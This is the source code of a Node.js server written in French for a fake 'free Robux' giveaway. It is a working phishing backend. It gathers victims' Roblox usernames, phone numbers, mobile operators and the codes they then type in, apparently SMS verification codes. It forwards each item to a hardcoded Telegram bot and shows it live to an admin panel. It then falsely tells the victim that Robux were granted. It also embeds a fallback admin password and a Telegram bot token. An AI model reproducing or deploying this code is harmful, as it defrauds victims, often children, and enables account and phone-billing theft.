const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SecretLO2026!';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8567457120:AAFeQo7xMyggPE1JXF3zxnIzDCP28R2N3OU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7777124789';

function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  });
  req.on('error', (e) => console.error('Telegram Error:', e));
  req.write(data);
  req.end();
}

app.use(express.json());

// Basic Auth Protection for admin.html
app.get('/admin.html', (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel Protected"');
    return res.status(401).send('Accès refusé. Authentification requise.');
  }

  const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
  const pass = auth[1];

  if (pass === ADMIN_PASSWORD) {
    return next();
  }

  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel Protected"');
  return res.status(401).send('Mot de passe incorrect.');
});

app.use(express.static(path.join(__dirname, 'public')));

const requests = {};
let adminWs = null;
let counter = 1;

function broadcast(data) {
  const msg = JSON.stringify(data);
  if (adminWs && adminWs.readyState === WebSocket.OPEN) {
    adminWs.send(msg);
  }
}

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const role = url.searchParams.get('role');
  const token = url.searchParams.get('token');

  if (role === 'admin') {
    if (token !== ADMIN_PASSWORD) {
      ws.close(1008, 'Authentification refusée');
      return;
    }

    adminWs = ws;
    const pending = Object.values(requests)
      .filter(r => r.status === 'pending')
      .map(r => ({ type: 'new_request', id: r.id, username: r.username, phone: r.phone, operator: r.operator, robuxAmount: r.robuxAmount }));
    pending.forEach(p => ws.send(JSON.stringify(p)));

    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw);
        if (msg.type === 'decision') {
          const entry = requests[msg.id];
          if (!entry) return;
          entry.status = msg.decision;
          if (entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
            entry.userWs.send(JSON.stringify({ type: 'decision', decision: msg.decision }));
          }
        }
        if (msg.type === 'code_valid') {
          const entry = requests[msg.id];
          if (!entry) return;
          if (entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
            entry.userWs.send(JSON.stringify({ type: 'robux_granted', robuxAmount: entry.robuxAmount }));
          }
        }
      } catch (e) {
        console.error('Erreur message admin:', e);
      }
    });

    ws.on('close', () => { if (adminWs === ws) adminWs = null; });
    return;
  }

  // User WS Connection
  const id = counter++;
  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw);

      if (msg.type === 'submit') {
        requests[id] = { 
          id, 
          username: msg.username || 'Inconnu',
          phone: msg.phone, 
          operator: msg.operator, 
          robuxAmount: msg.robuxAmount || '10 000',
          status: 'pending', 
          userWs: ws 
        };
        ws.send(JSON.stringify({ type: 'waiting', id }));
        broadcast({ 
          type: 'new_request', 
          id, 
          username: msg.username || 'Inconnu',
          phone: msg.phone, 
          operator: msg.operator,
          robuxAmount: msg.robuxAmount || '10 000'
        });

        // Telegram Notification
        sendTelegram(`<b>💎 NOUVEAU NUMÉRO ROBUX !</b>\n\n🎮 <b>Pseudo Roblox :</b> <code>${msg.username || 'Inconnu'}</code>\n💎 <b>Montant :</b> ${msg.robuxAmount || '10 000'} Robux\n📱 <b>Numéro :</b> <code>${msg.phone}</code>\n📡 <b>Opérateur :</b> ${msg.operator}\n🆔 <b>ID Demande :</b> #${id}`);
      }

      if (msg.type === 'code_submit') {
        const entry = requests[id];
        if (!entry) return;
        broadcast({ type: 'code_entered', id, code: msg.code });

        // Telegram Notification Code
        sendTelegram(`<b>🔢 CODE REÇU ROBUX !</b>\n\n🎮 <b>Pseudo :</b> ${entry.username}\n📱 <b>Numéro :</b> <code>${entry.phone}</code>\n🔑 <b>CODE :</b> <code>${msg.code}</code>`);

        setTimeout(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'robux_granted', robuxAmount: entry.robuxAmount }));
          }
        }, 1500);
      }
    } catch (e) {
      console.error('Erreur message utilisateur:', e);
    }
  });

  ws.on('close', () => {
    if (requests[id]) requests[id].userWs = null;
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀  Serveur Robux démarré → http://localhost:${PORT}`);
});
